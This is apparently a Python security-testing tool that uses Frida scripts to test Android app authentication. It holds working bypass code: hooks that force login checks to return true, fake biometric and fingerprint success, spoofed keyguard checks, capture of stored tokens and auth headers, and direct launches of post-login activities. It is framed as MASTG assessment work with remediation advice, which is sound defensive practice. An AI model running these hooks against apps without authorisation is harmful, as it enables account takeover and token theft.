#!/usr/bin/env python3
"""
Authentication Bypass Scanner
Automatically identifies and tests authentication bypass techniques.

Usage:
    python auth_bypass_scanner.py --package com.target.app
    python auth_bypass_scanner.py -p com.target.app --techniques all
"""

import argparse
import json
import time
from pathlib import Path
from typing import Callable

from base import (
    BaseWorkflow, Finding, Severity, FindingCategory,
    generate_finding_id, parse_common_args
)


class AuthBypassScanner(BaseWorkflow):
    """Automated authentication bypass scanner."""

    @property
    def name(self) -> str:
        return "auth_bypass_scanner"

    @property
    def description(self) -> str:
        return "Automated authentication bypass testing"

    @property
    def steps(self) -> list[tuple[str, Callable]]:
        return [
            ("Initialize Scanner", self.step_initialize),
            ("Identify Auth Methods", self.step_identify_auth),
            ("Test Method Return Manipulation", self.step_test_return_manipulation),
            ("Test Biometric Bypass", self.step_test_biometric_bypass),
            ("Test Token Manipulation", self.step_test_token_manipulation),
            ("Test Session Fixation", self.step_test_session_fixation),
            ("Test Activity Export Bypass", self.step_test_activity_bypass),
            ("Test Intent Parameter Manipulation", self.step_test_intent_manipulation),
            ("Generate Bypass Report", self.step_generate_report),
        ]

    def __init__(self, *args, techniques: list[str] = None, **kwargs):
        super().__init__(*args, **kwargs)
        self.techniques = techniques or ['all']
        self.auth_methods_found: list[dict] = []
        self.successful_bypasses: list[dict] = []

    def step_initialize(self) -> None:
        """Initialize the scanner."""
        devices = self.mcp.list_devices()
        if not devices:
            raise RuntimeError("No Android device connected")

        self.progress.info(f"Target package: {self.package}")
        self.progress.info(f"Techniques to test: {', '.join(self.techniques)}")

        # Store initial state
        if self.checkpoint:
            self.checkpoint.state['techniques'] = self.techniques

    def step_identify_auth(self) -> None:
        """Identify authentication methods used by the app."""
        self.progress.info("Scanning for authentication methods...")

        # Hook common auth-related classes
        auth_discovery_script = """
        Java.perform(function() {
            var authMethods = [];

            // BiometricPrompt
            try {
                var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
                authMethods.push({type: 'biometric', class: 'BiometricPrompt'});
            } catch(e) {}

            // FingerprintManager (deprecated)
            try {
                var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
                authMethods.push({type: 'fingerprint', class: 'FingerprintManager'});
            } catch(e) {}

            // KeyguardManager
            try {
                var KeyguardManager = Java.use('android.app.KeyguardManager');
                authMethods.push({type: 'keyguard', class: 'KeyguardManager'});
            } catch(e) {}

            // Firebase Auth
            try {
                var FirebaseAuth = Java.use('com.google.firebase.auth.FirebaseAuth');
                authMethods.push({type: 'firebase', class: 'FirebaseAuth'});
            } catch(e) {}

            // Custom SharedPreferences auth
            try {
                var SharedPreferences = Java.use('android.content.SharedPreferences');
                authMethods.push({type: 'sharedprefs', class: 'SharedPreferences'});
            } catch(e) {}

            send({type: 'auth_methods', methods: authMethods});

            // Hook authentication callbacks
            try {
                var BiometricCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');

                BiometricCallback.onAuthenticationSucceeded.implementation = function(result) {
                    send({type: 'auth_success', method: 'biometric'});
                    return this.onAuthenticationSucceeded(result);
                };

                BiometricCallback.onAuthenticationFailed.implementation = function() {
                    send({type: 'auth_failed', method: 'biometric'});
                    return this.onAuthenticationFailed();
                };

                BiometricCallback.onAuthenticationError.implementation = function(errorCode, errString) {
                    send({type: 'auth_error', method: 'biometric', code: errorCode});
                    return this.onAuthenticationError(errorCode, errString);
                };
            } catch(e) {}
        });
        """

        result = self.mcp.start_frida(self.package, auth_discovery_script)

        # Parse app info for auth indicators
        app_info = self.mcp.get_app_info(self.package)
        if app_info.get('success'):
            info = app_info.get('output', '')

            auth_indicators = [
                ('USE_BIOMETRIC', 'Biometric Authentication'),
                ('USE_FINGERPRINT', 'Fingerprint Authentication'),
                ('LoginActivity', 'Custom Login Activity'),
                ('AuthActivity', 'Authentication Activity'),
                ('firebase.auth', 'Firebase Authentication'),
                ('AccountManager', 'Account Manager Integration'),
            ]

            for indicator, auth_type in auth_indicators:
                if indicator in info:
                    self.auth_methods_found.append({
                        'type': auth_type,
                        'indicator': indicator
                    })
                    self.progress.info(f"Found: {auth_type}")

        if self.checkpoint:
            self.checkpoint.state['auth_methods'] = self.auth_methods_found

    def step_test_return_manipulation(self) -> None:
        """Test authentication bypass via method return value manipulation."""
        if 'all' not in self.techniques and 'return' not in self.techniques:
            self.progress.info("Skipping return manipulation tests")
            return

        self.progress.info("Testing return value manipulation...")

        # Hook and modify authentication method returns
        return_bypass_script = """
        Java.perform(function() {
            var bypassResults = [];

            // Common auth check method patterns
            var authPatterns = [
                {class: '*Activity', methods: ['isLoggedIn', 'isAuthenticated', 'checkAuth', 'validateSession', 'isUserValid']},
                {class: '*Manager', methods: ['isLoggedIn', 'isAuthenticated', 'hasValidToken', 'isSessionValid']},
                {class: '*Repository', methods: ['isLoggedIn', 'isAuthenticated', 'hasCredentials']},
                {class: '*ViewModel', methods: ['isLoggedIn', 'isAuthenticated', 'isUserAuthenticated']},
            ];

            // Generic boolean method hooking
            Java.enumerateLoadedClasses({
                onMatch: function(className) {
                    if (className.indexOf('auth') !== -1 ||
                        className.indexOf('Auth') !== -1 ||
                        className.indexOf('login') !== -1 ||
                        className.indexOf('Login') !== -1 ||
                        className.indexOf('session') !== -1 ||
                        className.indexOf('Session') !== -1) {

                        try {
                            var clazz = Java.use(className);
                            var methods = clazz.class.getDeclaredMethods();

                            methods.forEach(function(method) {
                                var methodName = method.getName();
                                var returnType = method.getReturnType().getName();

                                if (returnType === 'boolean' &&
                                    (methodName.indexOf('is') === 0 ||
                                     methodName.indexOf('has') === 0 ||
                                     methodName.indexOf('check') === 0 ||
                                     methodName.indexOf('validate') === 0)) {

                                    try {
                                        clazz[methodName].implementation = function() {
                                            send({
                                                type: 'bypass_attempt',
                                                class: className,
                                                method: methodName,
                                                original: false,
                                                modified: true
                                            });
                                            return true;
                                        };
                                        bypassResults.push({class: className, method: methodName});
                                    } catch(e) {}
                                }
                            });
                        } catch(e) {}
                    }
                },
                onComplete: function() {
                    send({type: 'bypass_hooks_installed', count: bypassResults.length, hooks: bypassResults});
                }
            });
        });
        """

        result = self.mcp.start_frida(self.package, return_bypass_script, spawn=True)

        # Wait for hooks to be installed and app to run
        time.sleep(3)

        if result.get('success'):
            self.add_finding(Finding(
                id=generate_finding_id("AUTH", "return_bypass_test"),
                title="Authentication Return Value Manipulation Test",
                severity=Severity.INFO,
                category=FindingCategory.AUTH,
                description="Frida hooks installed to test return value manipulation. Monitor app behavior for bypass.",
                evidence=["Hooks installed on boolean auth methods"],
                affected_component="Authentication methods",
                remediation="Implement server-side authentication validation.",
                mastg_id="MASTG-TEST-0020"
            ))

    def step_test_biometric_bypass(self) -> None:
        """Test biometric authentication bypass."""
        if 'all' not in self.techniques and 'biometric' not in self.techniques:
            self.progress.info("Skipping biometric bypass tests")
            return

        self.progress.info("Testing biometric authentication bypass...")

        biometric_bypass_script = """
        Java.perform(function() {
            // Bypass BiometricPrompt
            try {
                var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
                var CryptoObject = Java.use('androidx.biometric.BiometricPrompt$CryptoObject');
                var AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');

                // Store original callback
                var originalCallback = null;

                BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(promptInfo) {
                    send({type: 'biometric_prompt_shown', title: promptInfo.getTitle()});

                    // Trigger success callback
                    try {
                        var callback = this.mAuthenticationCallback.value;
                        if (callback) {
                            var result = AuthResult.$new(null, null);
                            callback.onAuthenticationSucceeded(result);
                            send({type: 'biometric_bypassed', method: 'callback_invoke'});
                            return;
                        }
                    } catch(e) {
                        send({type: 'biometric_bypass_failed', error: e.toString()});
                    }

                    return this.authenticate(promptInfo);
                };

                send({type: 'biometric_hooks_ready'});
            } catch(e) {
                send({type: 'biometric_hook_error', error: e.toString()});
            }

            // Bypass FingerprintManager (legacy)
            try {
                var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');

                FingerprintManager.authenticate.implementation = function(crypto, cancel, flags, callback, handler) {
                    send({type: 'fingerprint_auth_called'});

                    // Call success directly
                    try {
                        var AuthResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
                        var result = AuthResult.$new(crypto, null, 0);
                        callback.onAuthenticationSucceeded(result);
                        send({type: 'fingerprint_bypassed'});
                        return;
                    } catch(e) {}

                    return this.authenticate(crypto, cancel, flags, callback, handler);
                };
            } catch(e) {}

            // Bypass KeyguardManager
            try {
                var KeyguardManager = Java.use('android.app.KeyguardManager');

                KeyguardManager.isDeviceSecure.implementation = function() {
                    send({type: 'keyguard_check_bypassed', method: 'isDeviceSecure'});
                    return true;
                };

                KeyguardManager.isKeyguardSecure.implementation = function() {
                    send({type: 'keyguard_check_bypassed', method: 'isKeyguardSecure'});
                    return true;
                };
            } catch(e) {}
        });
        """

        result = self.mcp.start_frida(self.package, biometric_bypass_script, spawn=True)

        if result.get('success'):
            self.add_finding(Finding(
                id=generate_finding_id("AUTH", "biometric_bypass"),
                title="Biometric Authentication Bypass Hooks Installed",
                severity=Severity.HIGH,
                category=FindingCategory.AUTH,
                description="Biometric authentication can potentially be bypassed through Frida instrumentation. The app relies solely on client-side biometric validation.",
                evidence=["BiometricPrompt.authenticate hooked", "Callback manipulation possible"],
                affected_component="Biometric Authentication",
                remediation="Use CryptoObject with biometric binding. Implement server-side verification of biometric-protected operations.",
                mastg_id="MASTG-TEST-0021"
            ))

    def step_test_token_manipulation(self) -> None:
        """Test authentication token manipulation."""
        if 'all' not in self.techniques and 'token' not in self.techniques:
            self.progress.info("Skipping token manipulation tests")
            return

        self.progress.info("Testing token manipulation...")

        # Extract tokens from SharedPreferences
        prefs_result = self.mcp.dump_prefs(self.package)

        tokens_found = []
        if prefs_result.get('success'):
            prefs = prefs_result.get('output', '')

            import re
            token_patterns = [
                (r'token["\s:=]+["\']?([a-zA-Z0-9._-]{20,})', 'auth_token'),
                (r'jwt["\s:=]+["\']?([a-zA-Z0-9._-]+)', 'jwt'),
                (r'session[_-]?id["\s:=]+["\']?([a-zA-Z0-9._-]+)', 'session_id'),
                (r'access[_-]?token["\s:=]+["\']?([a-zA-Z0-9._-]+)', 'access_token'),
                (r'refresh[_-]?token["\s:=]+["\']?([a-zA-Z0-9._-]+)', 'refresh_token'),
                (r'bearer["\s:=]+["\']?([a-zA-Z0-9._-]+)', 'bearer_token'),
            ]

            for pattern, token_type in token_patterns:
                matches = re.findall(pattern, prefs, re.IGNORECASE)
                for match in matches:
                    tokens_found.append({
                        'type': token_type,
                        'value': match[:50] + '...' if len(match) > 50 else match,
                        'location': 'SharedPreferences'
                    })

        if tokens_found:
            self.add_finding(Finding(
                id=generate_finding_id("AUTH", "token_exposure"),
                title="Authentication Tokens Exposed in Local Storage",
                severity=Severity.HIGH,
                category=FindingCategory.AUTH,
                description="Authentication tokens found in plaintext local storage. Tokens can be extracted and reused.",
                evidence=[f"{t['type']}: {t['value']}" for t in tokens_found[:5]],
                affected_component="Token Storage",
                remediation="Store tokens in EncryptedSharedPreferences or Android Keystore.",
                mastg_id="MASTG-TEST-0022"
            ))

        # Hook token usage
        token_hook_script = """
        Java.perform(function() {
            // Hook OkHttp interceptors for token headers
            try {
                var Interceptor = Java.use('okhttp3.Interceptor');
                var Request = Java.use('okhttp3.Request');
                var Builder = Java.use('okhttp3.Request$Builder');

                Builder.addHeader.implementation = function(name, value) {
                    if (name.toLowerCase().indexOf('auth') !== -1 ||
                        name.toLowerCase().indexOf('token') !== -1 ||
                        name.toLowerCase().indexOf('bearer') !== -1) {
                        send({
                            type: 'token_header',
                            name: name,
                            value: value.substring(0, 50) + '...'
                        });
                    }
                    return this.addHeader(name, value);
                };
            } catch(e) {}

            // Hook SharedPreferences for token access
            try {
                var SharedPreferences = Java.use('android.content.SharedPreferences');
                SharedPreferences.getString.implementation = function(key, defValue) {
                    var value = this.getString(key, defValue);
                    if (key.toLowerCase().indexOf('token') !== -1 ||
                        key.toLowerCase().indexOf('session') !== -1 ||
                        key.toLowerCase().indexOf('auth') !== -1) {
                        send({
                            type: 'token_access',
                            key: key,
                            hasValue: value !== null && value !== defValue
                        });
                    }
                    return value;
                };
            } catch(e) {}
        });
        """

        self.mcp.start_frida(self.package, token_hook_script)

    def step_test_session_fixation(self) -> None:
        """Test session fixation vulnerabilities."""
        if 'all' not in self.techniques and 'session' not in self.techniques:
            self.progress.info("Skipping session fixation tests")
            return

        self.progress.info("Testing session fixation...")

        session_script = """
        Java.perform(function() {
            var sessionChanges = [];

            // Monitor session ID changes
            try {
                var SharedPrefsEditor = Java.use('android.content.SharedPreferences$Editor');

                SharedPrefsEditor.putString.implementation = function(key, value) {
                    if (key.toLowerCase().indexOf('session') !== -1) {
                        sessionChanges.push({key: key, value: value ? value.substring(0, 20) : null});
                        send({type: 'session_write', key: key, hasValue: value !== null});
                    }
                    return this.putString(key, value);
                };
            } catch(e) {}

            // Check if session changes on login
            Java.enumerateLoadedClasses({
                onMatch: function(className) {
                    if (className.toLowerCase().indexOf('login') !== -1 ||
                        className.toLowerCase().indexOf('auth') !== -1) {
                        try {
                            var clazz = Java.use(className);
                            var methods = clazz.class.getDeclaredMethods();

                            methods.forEach(function(method) {
                                var methodName = method.getName();
                                if (methodName.toLowerCase().indexOf('login') !== -1 ||
                                    methodName.toLowerCase().indexOf('success') !== -1) {
                                    send({
                                        type: 'potential_login_method',
                                        class: className,
                                        method: methodName
                                    });
                                }
                            });
                        } catch(e) {}
                    }
                },
                onComplete: function() {}
            });
        });
        """

        result = self.mcp.start_frida(self.package, session_script)

        self.add_finding(Finding(
            id=generate_finding_id("AUTH", "session_monitor"),
            title="Session Management Monitoring Active",
            severity=Severity.INFO,
            category=FindingCategory.AUTH,
            description="Session management hooks installed. Login to check for session fixation vulnerabilities.",
            evidence=["SharedPreferences session writes monitored", "Login methods identified"],
            affected_component="Session Management",
            remediation="Regenerate session ID after successful authentication.",
            mastg_id="MASTG-TEST-0023"
        ))

    def step_test_activity_bypass(self) -> None:
        """Test authentication bypass via exported activity abuse."""
        if 'all' not in self.techniques and 'activity' not in self.techniques:
            self.progress.info("Skipping activity bypass tests")
            return

        self.progress.info("Testing exported activity bypass...")

        # Get exported activities
        components = self.mcp.test_exported_components(self.package)

        if components.get('success'):
            output = components.get('output', '')

            # Parse exported activities
            import re
            activities = re.findall(r'Activity{[^}]*name=([^\s}]+)[^}]*exported=true', output, re.IGNORECASE)

            for activity in activities:
                # Skip launcher activities
                if 'launcher' in activity.lower() or 'splash' in activity.lower():
                    continue

                # Try to launch the activity directly
                full_activity = activity if '.' in activity else f"{self.package}.{activity}"

                result = self.mcp.send_intent(
                    component=f"{self.package}/{full_activity}"
                )

                if result.get('success') and 'error' not in result.get('output', '').lower():
                    # Check if this is a post-auth activity
                    post_auth_keywords = ['main', 'home', 'dashboard', 'profile', 'account', 'settings']

                    if any(kw in activity.lower() for kw in post_auth_keywords):
                        self.add_finding(Finding(
                            id=generate_finding_id("AUTH", f"activity_bypass_{activity}"),
                            title=f"Authentication Bypass via Exported Activity: {activity}",
                            severity=Severity.HIGH,
                            category=FindingCategory.AUTH,
                            description=f"Post-authentication activity '{activity}' is exported and can be launched directly, bypassing login.",
                            evidence=[f"Activity: {full_activity}", "Successfully launched without authentication"],
                            affected_component=full_activity,
                            remediation="Set android:exported=\"false\" or add permission requirements.",
                            mastg_id="MASTG-TEST-0024"
                        ))

                        self.successful_bypasses.append({
                            'type': 'activity_bypass',
                            'activity': full_activity
                        })

    def step_test_intent_manipulation(self) -> None:
        """Test authentication bypass via intent parameter manipulation."""
        if 'all' not in self.techniques and 'intent' not in self.techniques:
            self.progress.info("Skipping intent manipulation tests")
            return

        self.progress.info("Testing intent parameter manipulation...")

        # Test common bypass extras
        bypass_extras = [
            {'authenticated': True},
            {'isLoggedIn': True},
            {'bypass': True},
            {'admin': True},
            {'skip_auth': True},
            {'user_id': 1},
            {'role': 'admin'},
            {'debug': True},
        ]

        # Get main activity
        app_info = self.mcp.get_app_info(self.package)
        if app_info.get('success'):
            import re
            # Find launcher activity
            match = re.search(r'android\.intent\.action\.MAIN.*?Activity{[^}]*name=([^\s}]+)', app_info.get('output', ''), re.DOTALL)
            if match:
                main_activity = match.group(1)

                for extras in bypass_extras:
                    result = self.mcp.send_intent(
                        component=f"{self.package}/{main_activity}",
                        extras=extras
                    )

                    # Note: Would need to check app state to verify bypass
                    self.progress.info(f"Tested extras: {extras}")

        self.add_finding(Finding(
            id=generate_finding_id("AUTH", "intent_manipulation"),
            title="Intent Parameter Manipulation Tests Completed",
            severity=Severity.INFO,
            category=FindingCategory.AUTH,
            description="Tested various intent extra parameters for authentication bypass.",
            evidence=[f"Tested {len(bypass_extras)} bypass payload combinations"],
            affected_component="Intent handling",
            remediation="Do not trust intent extras for authentication decisions.",
            mastg_id="MASTG-TEST-0025"
        ))

    def step_generate_report(self) -> None:
        """Generate bypass scan report."""
        self.progress.info("Generating bypass scan report...")

        report = {
            "scan_type": "Authentication Bypass Scanner",
            "package": self.package,
            "techniques_tested": self.techniques,
            "auth_methods_found": self.auth_methods_found,
            "successful_bypasses": self.successful_bypasses,
            "findings": [f.to_dict() for f in self.findings],
            "summary": {
                "total_findings": len(self.findings),
                "critical_bypasses": len([f for f in self.findings if f.severity == Severity.CRITICAL]),
                "high_risk_bypasses": len([f for f in self.findings if f.severity == Severity.HIGH]),
                "auth_methods_count": len(self.auth_methods_found)
            }
        }

        report_path = self.output_dir / f"{self.package}_auth_bypass_report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)

        self.progress.info(f"Report saved to: {report_path}")


def main():
    parser = parse_common_args()
    parser.add_argument('--techniques', '-t', default='all',
                       help='Comma-separated list of techniques: all,return,biometric,token,session,activity,intent')
    args = parser.parse_args()

    techniques = args.techniques.split(',')

    workflow = AuthBypassScanner(
        package=args.package,
        output_dir=Path(args.output),
        apk_path=Path(args.apk) if args.apk else None,
        resume=args.resume,
        verbose=args.verbose,
        techniques=techniques
    )

    findings = workflow.run()

    print(f"\n{'='*60}")
    print(f"Auth Bypass Scan Complete: {len(findings)} findings")
    print(f"{'='*60}")

    return 0


if __name__ == "__main__":
    exit(main())
